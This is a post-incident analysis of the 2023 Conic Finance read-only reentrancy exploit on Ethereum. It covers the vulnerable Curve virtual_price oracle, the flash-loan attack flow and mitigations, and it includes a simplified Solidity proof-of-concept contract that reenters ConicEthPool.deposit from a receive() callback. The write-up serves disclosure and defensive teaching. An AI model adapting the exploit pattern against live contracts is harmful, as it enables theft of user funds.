# Conic Finance Read-Only Reentrancy Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | Conic Finance (ConicEthPool) |
| Date | 2023-07-30 |
| Chain | Ethereum Mainnet |
| Loss | ~$3,250,000 USD |
| Attack Type | Read-Only Reentrancy |
| CWE | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| Attacker Address | `0x8d67db0b205e32a5dd96145f022fa18aae7dc8aa` |
| Attack Contract | `0x743599ba5cfa3ce8c59691af5ef279aaafa2e4eb` |
| Vulnerable Contract | `0xBb787d6243a8D450659E09ea6fD82F1C859691e9` (ConicEthPool) |
| Attack TX | `0x8b74995d1d61d3d7547575649136b8765acb22882960f0636941c44ec7bbe146` |
| Fork Block | 17,740,954 |

## 2. Vulnerability Code Analysis

ConicEthPool's oracle (`IGenericOracleV2`) used `virtual_price` to calculate Curve LP token prices. When reentering via the `receive()` callback during ETH withdrawal from a Curve pool, Curve's internal state had already been updated but `virtual_price` still returned the previous (stale) value.

```solidity
// Vulnerable pattern: Curve virtual_price-based oracle
contract GenericOracle {
    function getUSDPrice(address token) external view returns (uint256) {
        if (isCurveLPToken(token)) {
            ICurve pool = getCurvePool(token);
            // Vulnerable: view function callable even during reentrancy
            // Inconsistency between pre/post Curve internal state update
            uint256 virtualPrice = pool.get_virtual_price();
            uint256 underlyingPrice = getUnderlyingPrice(pool);
            return virtualPrice * underlyingPrice / 1e18;
        }
    }
}

// ConicEthPool's deposit calculates based on oracle price
function deposit(uint256 underlyingAmount, uint256 minLpReceived) external payable {
    uint256 price = oracle.getUSDPrice(address(lpToken));  // manipulated price
    uint256 lpToMint = underlyingAmount * 1e18 / price;
    require(lpToMint >= minLpReceived, "Slippage");
    _mint(msg.sender, lpToMint);  // inflated LP received
}
```

**Vulnerability**: When reentering via the `receive()` callback during ETH removal from a Curve pool, `virtual_price` has not yet been updated, causing the oracle price to be inflated.

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: ConicEthPool.sol
    function depositFor(

// ...

    function withdraw(

// ...

    function _reentrancyCheck() internal {  // ❌
        for (uint256 i; i < _curvePools.length(); i++) {
            address curvePool_ = _curvePools.at(i);
            ICurveHandlerV3(controller.curveHandler()).reentrancyCheck(curvePool_);  // ❌
        }
    }
```

```solidity
// File: ICurveHandlerV3.sol
    function reentrancyCheck(address _curvePool) external;  // ❌
```

## 3. Attack Flow

```
Attacker [0x8d67db0b205e32a5dd96145f022fa18aae7dc8aa]
  │
  ├─1─▶ AaveV2.flashLoan() [0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9]
  │      Borrow 20,000 stETH
  │
  ├─2─▶ AaveV3.flashLoanSimple() [0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2]
  │      Borrow 850 cbETH
  │
  ├─3─▶ BalancerVault.flashLoan() [0xBA12222222228d8Ba445958a75a0704d566BF2C8]
  │      Borrow 20,550 rETH + 3,000 cbETH + 28,504 WETH
  │
  ├─4─▶ Add liquidity to Curve LidoPool [0xDC24316b9AE028F1497c275EB9192a3Ea0f67022]
  │
  ├─5─▶ Call Curve LidoPool.remove_liquidity()
  │      └─▶ ETH transfer triggers receive() callback
  │            │
  │            ├─▶ Read-Only Reentrancy: call oracle.getUSDPrice()
  │            │    virtual_price still holds previous (inflated) value
  │            │
  │            └─▶ Call ConicEthPool.deposit()
  │                  Mint excess LP tokens using inflated oracle price
  │
  ├─6─▶ Excess LP tokens → converted to ETH
  │
  └─7─▶ Repay all flash loans + realize ~$3.25M USD profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract ConicExploit {
    IConicEthPool conicPool = IConicEthPool(0xBb787d6243a8D450659E09ea6fD82F1C859691e9);
    ICurvePool lidoPool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IGenericOracleV2 oracle = IGenericOracleV2(0x286eF89cD2DA6728FD2cb3e1d1c5766Bcea344b0);

    bool private attacking = false;
    uint256 private lpFromReentrancy;

    receive() external payable {
        if (attacking && msg.sender == address(lidoPool)) {
            // Read-Only Reentrancy: before Curve internal state update
            // virtual_price still holds an elevated value
            uint256 overpricedLp = conicPool.deposit{value: msg.value}(msg.value, 0);
            lpFromReentrancy += overpricedLp;
        }
    }

    function testExploit() external {
        // After obtaining flash loans...
        attacking = true;
        // Curve remove_liquidity → receive() reentrancy → receive excess LP
        lidoPool.remove_liquidity(lpBalance, [uint256(0), uint256(0)]);
        attacking = false;
        // LP tokens → convert to ETH
        conicPool.withdraw(lpFromReentrancy, 0);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| Vulnerability Type | Read-Only Reentrancy, Oracle Manipulation |
| Impact Scope | Full TVL of ConicEthPool |
| Explorer | [Etherscan](https://etherscan.io/address/0xBb787d6243a8D450659E09ea6fD82F1C859691e9) |

## 6. Security Recommendations

```solidity
// Fix 1: Check Curve pool state lock
// Verify reentrancy_lock of Curve V2 pool
function getUSDPrice(address token) external view returns (uint256) {
    if (isCurveLPToken(token)) {
        ICurveV2 pool = ICurveV2(getCurvePool(token));
        // Check Curve V2 reentrancy lock state
        // Call pool.claim_admin_fees() to check lock (reverts if reentrancy is active)
        try pool.claim_admin_fees() {} catch {
            revert("Curve pool is locked");
        }
        return pool.get_virtual_price() * getUnderlyingPrice(pool) / 1e18;
    }
}

// Fix 2: Apply nonReentrant to state-changing functions
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

function deposit(uint256 amount, uint256 minLp) external payable nonReentrant {
    // ...
}

// Fix 3: Use EMA price instead of Curve virtual_price in oracle
function getUSDPrice(address token) external view returns (uint256) {
    // Use EMA (Exponential Moving Average) price (manipulation-resistant)
    return ICurveV2(pool).price_oracle();  // EMA price
}
```

## 7. Lessons Learned

1. **Read-Only Reentrancy Risk**: Even `view` functions can be vulnerable to reentrancy attacks. Beware of the "read-only reentrancy" pattern where state is temporarily inconsistent during a callback in which an external contract receives ETH.
2. **Caution with Curve Virtual Price**: Curve's `get_virtual_price()` can return an inaccurate value during reentrancy. Always check the reentrancy lock state of Curve V2 pools first.
3. **Oracle Design**: DeFi oracles that depend on external pool state must account for the reentrancy potential of those pools. EMA- or TWAP-based oracles are safer alternatives.
4. **Compounded Flash Loan Capital**: Combining three large flash loan pools (Aave V2, Aave V3, Balancer) can source hundreds of millions of dollars in capital, significantly amplifying the attack scale.